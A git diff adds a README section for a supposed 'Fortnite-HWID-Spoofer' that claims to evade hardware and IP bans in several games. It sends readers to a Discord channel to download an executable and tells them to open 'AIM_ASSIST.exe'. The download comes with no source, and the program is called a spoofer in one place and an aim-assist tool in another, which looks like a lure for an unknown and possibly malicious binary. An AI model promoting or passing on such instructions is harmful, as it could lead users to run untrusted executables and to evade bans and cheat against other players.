@@ -12,8 +12,28 @@ A demo video (outdated) can be found [here](https://discord.gg/8fZ8AXnKUj).
 ![thumbnail](https://i.imgur.com/T4qGE3v.png)
 
 ## Installation
+# Fortnite-HWID-Spoofer
+Custom Created Hardware ID Spoofer to Bypass Hardware or IP Bans
+<br>
 
-1. Get the guide and updates here [Discord](https://discord.gg/8fZ8AXnKUj)
+[Join to our discord to download](https://discord.gg/8fZ8AXnKUj)
+
+##  How To Use
+
+Download the `executable` on our Discord channel `#hwid-spoofer-free`
+
+[Discord](https://discord.gg/8fZ8AXnKUj)
+
+```sh
+open AIM_ASSIST.exe
+```
+
+```sh
+Enjoy
+```
+
+## Disclaimer
+Works for Games like Rust, Fortnite, Apex Legends, etc. that dont use Kernal Based Anti-Cheat [eg. Valorant - Riot Vanguard]
 
 If you find this project interesting or helpful, please star the repository.
 
